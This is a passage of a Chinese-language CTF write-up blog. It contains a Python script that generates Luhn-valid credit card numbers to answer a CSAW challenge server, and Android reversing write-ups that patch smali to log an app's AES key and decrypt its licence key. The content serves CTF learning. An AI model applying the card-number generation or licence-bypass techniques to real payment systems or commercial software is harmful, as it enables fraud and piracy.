   <span class="keyword">if</span> check_sum % <span class="number">10</span> == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> nums + [<span class="number">0</span>]</div><div class="line">        <span class="keyword">return</span> nums + [<span class="number">10</span> - (check_sum % <span class="number">10</span>) ]</div><div class="line">    </div><div class="line">    <span class="comment"># main body</span></div><div class="line">    t = type.lower()    </div><div class="line">    initial, rem = prefill(t)</div><div class="line">    so_far = initial + [randint(<span class="number">1</span>,<span class="number">9</span>) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(rem - <span class="number">1</span>)]</div><div class="line">    <span class="comment">#print "Card type: %s, " % t</span></div><div class="line">    cardnum = <span class="string">""</span>.join(map(str,finalize(so_far))).strip(<span class="string">'\n'</span>)</div><div class="line">    <span class="keyword">print</span> cardnum</div><div class="line">    <span class="keyword">return</span> cardnum</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># # run - check</span></div><div class="line"><span class="comment"># generate_card("discover")</span></div><div class="line"><span class="comment"># generate_card("mastercard")</span></div><div class="line"><span class="comment"># generate_card("americanexpress")</span></div><div class="line"></div><div class="line"><span class="comment"># generate_card("visa13")</span></div><div class="line"><span class="comment"># generate_card("visa16")</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ck</span><span class="params">(nums)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line"><span class="string">    Make the current generated list pass the Luhn check by checking and adding</span></div><div class="line"><span class="string">    the last digit appropriately bia calculating the check sum</span></div><div class="line"><span class="string">    """</span></div><div class="line">    check_sum = <span class="number">0</span></div><div class="line">    </div><div class="line">    is_even = <span class="keyword">True</span> <span class="keyword">if</span> ((len(nums) + <span class="number">1</span> )% <span class="number">2</span>) == <span class="number">0</span> <span class="keyword">else</span> <span class="keyword">False</span></div><div class="line">    </div><div class="line">    <span class="string">"""</span></div><div class="line"><span class="string">    Reason for this check offset is to figure out whther the final list is going</span></div><div class="line"><span class="string">    to be even or odd which will affect calculating the check_sum.</span></div><div class="line"><span class="string">    This is mainly also to avoid reversing the list back and forth which is specified</span></div><div class="line"><span class="string">    on the Luhn algorithm.</span></div><div class="line"><span class="string">    """</span></div><div class="line">    check_offset = (len(nums) + <span class="number">1</span>) % <span class="number">2</span></div><div class="line">    </div><div class="line">    <span class="keyword">for</span> i, n <span class="keyword">in</span> enumerate(nums):</div><div class="line">        i = int(i)</div><div class="line">        n = int(n)</div><div class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</div><div class="line">            <span class="keyword">if</span> is_even:</div><div class="line">                n_ = n*<span class="number">2</span></div><div class="line">                check_sum += n_ <span class="number">-9</span> <span class="keyword">if</span> n_ &gt; <span class="number">9</span> <span class="keyword">else</span> n_</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                check_sum += n</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        <span class="keyword">if</span> (i + check_offset) % <span class="number">2</span> == <span class="number">0</span>:</div><div class="line">            n_ = n*<span class="number">2</span></div><div class="line">            check_sum += n_ <span class="number">-9</span> <span class="keyword">if</span> n_ &gt; <span class="number">9</span> <span class="keyword">else</span> n_</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            check_sum += n</div><div class="line">    <span class="keyword">if</span> check_sum % <span class="number">10</span> == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    <span class="keyword">return</span> <span class="number">10</span> - (check_sum % <span class="number">10</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ck2</span><span class="params">(nums)</span>:</span></div><div class="line">    digits = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> str(nums)]</div><div class="line">    odd_digits = digits[<span class="number">-1</span>::<span class="number">-2</span>]</div><div class="line">    even_digits = digits[<span class="number">-2</span>::<span class="number">-2</span>]</div><div class="line">    total = sum(odd_digits)</div><div class="line">    <span class="keyword">for</span> digit <span class="keyword">in</span> even_digits:</div><div class="line">        total += sum([int(i) <span class="keyword">for</span> i <span class="keyword">in</span> str(<span class="number">2</span> * digit)])</div><div class="line">    <span class="keyword">if</span> total % <span class="number">10</span> == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">"1"</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">"0"</span></div><div class="line"></div><div class="line">conn = remote(<span class="string">"misc.chal.csaw.io"</span>, <span class="number">8308</span>)</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    cmd = conn.recvline()</div><div class="line">    <span class="keyword">print</span> cmd,</div><div class="line"></div><div class="line">    <span class="keyword">if</span> <span class="string">'I need to know if '</span> <span class="keyword">in</span> cmd:</div><div class="line">        card = <span class="string">""</span>.join(filter(str.isdigit, cmd))</div><div class="line">        card = card[:<span class="number">-2</span>]</div><div class="line">        <span class="keyword">print</span> card</div><div class="line">        conn.sendline(ck2(card))</div><div class="line">        conn.recvline()</div><div class="line"></div><div class="line">    <span class="keyword">elif</span> <span class="string">'Visa'</span> <span class="keyword">in</span> cmd:</div><div class="line">        conn.sendline(generate_card(<span class="string">'visa16'</span>))</div><div class="line">    <span class="keyword">elif</span> <span class="string">'MasterCard'</span> <span class="keyword">in</span> cmd:</div><div class="line">        conn.sendline(generate_card(<span class="string">'mastercard'</span>))</div><div class="line">    <span class="keyword">elif</span> <span class="string">'Discover'</span> <span class="keyword">in</span> cmd:</div><div class="line">        conn.sendline(generate_card(<span class="string">'discover'</span>))</div><div class="line">    <span class="keyword">elif</span> <span class="string">'American Express'</span> <span class="keyword">in</span> cmd:</div><div class="line">        conn.sendline(generate_card(<span class="string">'americanexpress'</span>))</div><div class="line">    <span class="keyword">elif</span> <span class="string">'starts with'</span> <span class="keyword">in</span> cmd:</div><div class="line">        num = generate_card(<span class="string">"num:"</span> + cmd[<span class="number">-6</span>:<span class="number">-2</span>])</div><div class="line">        conn.sendline(num)</div><div class="line">    <span class="keyword">elif</span> <span class="string">'ends with'</span> <span class="keyword">in</span> cmd <span class="keyword">and</span> cmd[<span class="number">-4</span>] <span class="keyword">in</span> <span class="string">'01234567890'</span>:</div><div class="line">        num = cmd[<span class="number">-6</span>:<span class="number">-2</span>]</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            card = generate_card(<span class="string">'visa11'</span>) + <span class="string">'1'</span> + num</div><div class="line">            <span class="keyword">if</span> ck(card[:<span class="number">-1</span>]) == int(card[<span class="number">-1</span>]):</div><div class="line">                <span class="keyword">print</span> card</div><div class="line">                conn.sendline(card)</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">elif</span> <span class="string">'ends with'</span> <span class="keyword">in</span> cmd:</div><div class="line">        num = cmd[<span class="number">-3</span>:<span class="number">-2</span>]</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            card = generate_card(<span class="string">'visa16'</span>)</div><div class="line">            <span class="keyword">if</span> card[<span class="number">-1</span>] == num:</div><div class="line">                conn.sendline(card)</div><div class="line">                <span class="keyword">break</span>;</div><div class="line"></div><div class="line">    <span class="keyword">print</span> conn.recvline(),</div></pre></td></tr></table></figure></p>
+<h2 id="tabIEZ"><a href="#tabIEZ" class="headerlink" title="tabIEZ"></a>tabIEZ</h2><p>Ascii值用表置换，长度不长直接手动查表逐位算出来的</p>
+<p><img src="tu.jpg" alt=""></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/28/Commercialapplication/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/28/Commercialapplication/" itemprop="url">Sharif University Quals CTF 2014 Commercial Application</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-28T16:49:43+08:00">
+                2017-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Sharif-University-Quals-CTF-2014-Commercial-Application"><a href="#Sharif-University-Quals-CTF-2014-Commercial-Application" class="headerlink" title="Sharif University Quals CTF 2014: Commercial Application"></a>Sharif University Quals CTF 2014: Commercial Application</h1><p><a href="https://github.com/ctfs/write-ups-2014/tree/master/su-ctf-quals-2014/commercial_application/" target="_blank" rel="external">Github Link</a></p>
+<blockquote>
+<p>Markdown哪儿都好就是插图太麻烦,尽量用语言描述</p>
+</blockquote>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>题目给的是一个Demo小程序,安装在手机或者虚拟机之后看是一个看图程序,一共三张<del>黄</del>图图,预览版只可以看一张,输入key之后可以看另外两张,提供了一个输入key的窗口,输入错误之后会提示错误(废话),想必正确的key就是题目的flag.</p>
+<h2 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h2><p>首先例行的对给的apk进行基础操作,我的习惯是同时恢复Java代码和Smali代码.分析的时候Java代码比较方便,出错或者是需要重新打包dex的时候使用Smali.逆向之后发现程序没有lib目录,且Java代码只经过简单混淆,没有报错,说明单纯分析Java代码逻辑即可.</p>
+<p>从输入错误key时候给出的报错语句入手,<code>Your licence key is incorrect...! Please try again with another.</code>这句在源程序中出现两次,都在<code>/edu/sharif/ctf/activities/MainActivity.java</code>之中,查看代码关键位置.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface paramDialogInterface, <span class="keyword">int</span> paramInt)</span></span></div><div class="line"><span class="function">      </span>&#123;</div><div class="line">        <span class="keyword">if</span> (KeyVerifier.isValidLicenceKey(<span class="keyword">this</span>.val$userInput.getText().toString(), MainActivity.<span class="keyword">this</span>.app.getDataHelper().getConfig().getSecurityKey(), MainActivity.<span class="keyword">this</span>.app.getDataHelper().getConfig().getSecurityIv()))</div><div class="line">        &#123;</div><div class="line">          MainActivity.<span class="keyword">this</span>.app.getDataHelper().updateLicence(<span class="number">2014</span>);</div><div class="line">          MainActivity.isRegisterd = <span class="keyword">true</span>;</div><div class="line">          MainActivity.<span class="keyword">this</span>.showAlertDialog(<span class="keyword">this</span>.val$context, <span class="string">"Thank you, Your application has full licence. Enjoy it...!"</span>);</div><div class="line">          <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        MainActivity.<span class="keyword">this</span>.showAlertDialog(<span class="keyword">this</span>.val$context, <span class="string">"Your licence key is incorrect...! Please try again with another."</span>);</div><div class="line">      &#125;</div></pre></td></tr></table></figure>
+<p>发现关键逻辑位于KeyVerifier.isValidLicenceKey函数中,对所在文件进行分析,会发现实质性调用的是encrypt函数,该函数需要三个参数.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isValidLicenceKey</span><span class="params">(String paramString1, String paramString2, String paramString3)</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">return</span> encrypt(paramString1, paramString2, paramString3).equals(<span class="string">"29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84"</span>);</div><div class="line">  &#125;</div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(String paramString1, String paramString2, String paramString3)</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">try</span></div><div class="line">    &#123;</div><div class="line">      SecretKeySpec localSecretKeySpec = <span class="keyword">new</span> SecretKeySpec(hexStringToBytes(paramString2), <span class="string">"AES"</span>);</div><div class="line">      Cipher localCipher = Cipher.getInstance(<span class="string">"AES/CBC/PKCS5Padding"</span>);</div><div class="line">      localCipher.init(<span class="number">1</span>, localSecretKeySpec, <span class="keyword">new</span> IvParameterSpec(paramString3.getBytes()));</div><div class="line">      String str = bytesToHexString(localCipher.doFinal(paramString1.getBytes()));</div><div class="line">      <span class="keyword">return</span> str;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (Exception localException)</div><div class="line">    &#123;</div><div class="line">      localException.printStackTrace();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
+<p>由代码可以发现,加密使用AES算法,对称加密就可逆,现在需要找出使用的三个参数paramString1,paramString2,paramString3,即可逆推出输入的值.回到MainActivity中考察传递三个参数的位置作分析,<br><code>KeyVerifier.isValidLicenceKey(this.val$userInput.getText().toString(), MainActivity.this.app.getDataHelper().getConfig().getSecurityKey(), MainActivity.this.app.getDataHelper().getConfig().getSecurityIv())</code><br>第一个参数是从UI中读入的用户输入,即用户输入的key,第二个是SecurityKey,第三个是SecurityIv,通过调用进一步分析源码包括程序带的SQLite数据库可以找到后两者的值,而AES加密之后的值应该是<br><code>29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84</code><br>这里使用一个<del>奇技淫巧</del>不去进一步考察代码,而是修改Smali代码,在使用三个值之前将它们从Log中打印出来,条用位置位于<code>class Ledu/sharif/ctf/activities/MainActivity$4</code>之中<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">.line</span> 211</div><div class="line"><span class="keyword">    .local</span> v0, <span class="string">"iv"</span>:<span class="class">Ljava/lang/String;</span></div><div class="line"></div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v3, v3&#125;, <span class="class">Landroid/util/Log;</span>-&gt;v(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v3, v2&#125;, <span class="class">Landroid/util/Log;</span>-&gt;v(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v3, v0&#125;, <span class="class">Landroid/util/Log;</span>-&gt;v(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)I</div><div class="line"></div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v3, v2, v0&#125;, <span class="class">Ledu/sharif/ctf/security/KeyVerifier;</span>-&gt;isValidLicenceKey(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)Z</div><div class="line"></div><div class="line">   <span class="built_in"> move-result </span>v1</div></pre></td></tr></table></figure></p>
+<p>重新打包dex,插入apk中,签名,运行之后随便输入点东西,通过Logcat可以截取三条Log,tag都是随便输入的内容,后两条即SecurityKey,SecurityIv<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">SecurityKey = 37eaae0141f1a3adf8a1dee655853714</div><div class="line">SecurityIv = a5efdbd57b84ca36</div><div class="line">encrypted = 29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84</div></pre></td></tr></table></figure></p>
+<h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>经过以上分析,已经可以基本确定解决问题方法,即利用KeyVerifier中的代码,更改Cipher工作模式为解密,接触答案并ASCII化为字符串,即为key(flag).完整代码如下所示<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.company;</div><div class="line"></div><div class="line"><span class="keyword">import</span> javax.crypto.Cipher;</div><div class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</div><div class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">        <span class="comment">// write your code here</span></div><div class="line">        String encrypted = <span class="string">"29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84"</span>;</div><div class="line">        String securityKey = <span class="string">"37eaae0141f1a3adf8a1dee655853714"</span>;</div><div class="line">        String securityIv = <span class="string">"a5efdbd57b84ca36"</span>;</div><div class="line">        String result = decrypt(encrypted, securityKey, securityIv);</div><div class="line">        System.out.println(result);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesToHexString</span><span class="params">(<span class="keyword">byte</span>[] paramArrayOfByte)</span> </span>&#123;</div><div class="line">        StringBuilder localStringBuilder = <span class="keyword">new</span> StringBuilder();</div><div class="line">        <span class="keyword">int</span> i = paramArrayOfByte.length;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; ; j++) &#123;</div><div class="line">            <span class="keyword">if</span> (j &gt;= i)</div><div class="line">                <span class="keyword">return</span> localStringBuilder.toString();</div><div class="line">            <span class="keyword">int</span> k = paramArrayOfByte[j];</div><div class="line">            Object[] arrayOfObject = <span class="keyword">new</span> Object[<span class="number">1</span>];</div><div class="line">            arrayOfObject[<span class="number">0</span>] = Integer.valueOf(k &amp; <span class="number">0xFF</span>);</div><div class="line">            localStringBuilder.append(String.format(<span class="string">"%02x"</span>, arrayOfObject));</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(String paramString1, String paramString2, String paramString3)</span> </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            SecretKeySpec localSecretKeySpec = <span class="keyword">new</span> SecretKeySpec(hexStringToBytes(paramString2), <span class="string">"AES"</span>);</div><div class="line">            Cipher localCipher = Cipher.getInstance(<span class="string">"AES/CBC/PKCS5Padding"</span>);</div><div class="line">            localCipher.init(Cipher.DECRYPT_MODE, localSecretKeySpec, <span class="keyword">new</span> IvParameterSpec(paramString3.getBytes()));</div><div class="line">            <span class="keyword">byte</span>[] bytes = localCipher.doFinal(hexStringToBytes(paramString1));</div><div class="line">            String flag = <span class="string">""</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytes) &#123;</div><div class="line">                flag += (<span class="keyword">char</span>) b;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span> flag;</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception localException) &#123;</div><div class="line">            localException.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hexStringToBytes(String paramString) &#123;</div><div class="line">        <span class="keyword">int</span> i = paramString.length();</div><div class="line">        <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[i / <span class="number">2</span>];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; ; j += <span class="number">2</span>) &#123;</div><div class="line">            <span class="keyword">if</span> (j &gt;= i)</div><div class="line">                <span class="keyword">return</span> arrayOfByte;</div><div class="line">            arrayOfByte[(j / <span class="number">2</span>)] = (<span class="keyword">byte</span>) ((Character.digit(paramString.charAt(j), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>) + Character.digit(paramString.charAt(j + <span class="number">1</span>), <span class="number">16</span>));</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>运行得到结果<br><strong>Flag:</strong><code>fl-ag-IS-se-ri-al-NU-MB-ER</code></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/28/SECCONQualsCTF2015Reverse-EngineeringAndroidAPK1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/28/SECCONQualsCTF2015Reverse-EngineeringAndroidAPK1/" itemprop="url">SECCON Quals CTF 2015 Reverse-Engineering Android APK 1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-28T16:49:43+08:00">
+                2017-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="SECCON-Quals-CTF-2015-Reverse-Engineering-Android-APK-1"><a href="#SECCON-Quals-CTF-2015-Reverse-Engineering-Android-APK-1" class="headerlink" title="SECCON Quals CTF 2015: Reverse-Engineering Android APK 1"></a>SECCON Quals CTF 2015: Reverse-Engineering Android APK 1</h1><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/seccon-quals-ctf-2015/binary/reverse-engineering-android-apk-1" target="_blank" rel="external">Github Link</a></p>
+<blockquote>
+<p>题目比较简单,不多赘述</p>
+</blockquote>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>不需要Overview,直接看代码逻辑即可</p>
+<h2 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h2><p>根据惯例对apk反编译,直接看Java代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt)</div><div class="line">    localTextView.setText(<span class="string">"SECCON&#123;"</span> + String.valueOf(<span class="number">107</span> * (MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.calc())) + <span class="string">"&#125;"</span>);</div></pre></td></tr></table></figure></p>
+<p>可以看出flag是形如<code>SECCON{107*(1000 + calc)}</code>形式,只有一个未知量是函数calc返回值,而这个函数是native函数,将lib中任意一个so文件拖入IDA,找到对应函数形式如下所示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">public Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc</div><div class="line">Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc proc near</div><div class="line">mov     eax, 7</div><div class="line">retn</div><div class="line">Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc endp</div><div class="line"></div><div class="line">_text ends</div></pre></td></tr></table></figure></p>
+<p>竟然直接返回7!</p>
+<h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>107*1007=107749</code><br>flag is SECCON{107749}</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/28/boomshakalaka-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/28/boomshakalaka-3/" itemprop="url">0CTF 2016 boomshakalaka-3</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-28T16:49:43+08:00">
+                2017-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="0CTF-boomshakalaka-3"><a href="#0CTF-boomshakalaka-3" class="headerlink" title="0CTF : boomshakalaka-3"></a>0CTF : boomshakalaka-3</h1><p><strong>Category:</strong> Mobile<br><strong>Points:</strong> 3<br><strong>Solves:</strong> 35<br><strong>Description:</strong></p>
+<blockquote>
+<p>play the game, get the highest score</p>
+</blockquote>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h2><p>脑洞题, 基础的分析之后可以发现是由Cocos2d写的游戏程序, 部分与flag有关的代码在Java层, 在sharedPreference里边写了MGNO, 进一步的写sharedPreference在native代码中寻找.</p>
+<p>从updateScore函数中可以发现根据分数写flag的明显痕迹, 其他方法中也有一部分写的代码, 但是顺序未知.</p>
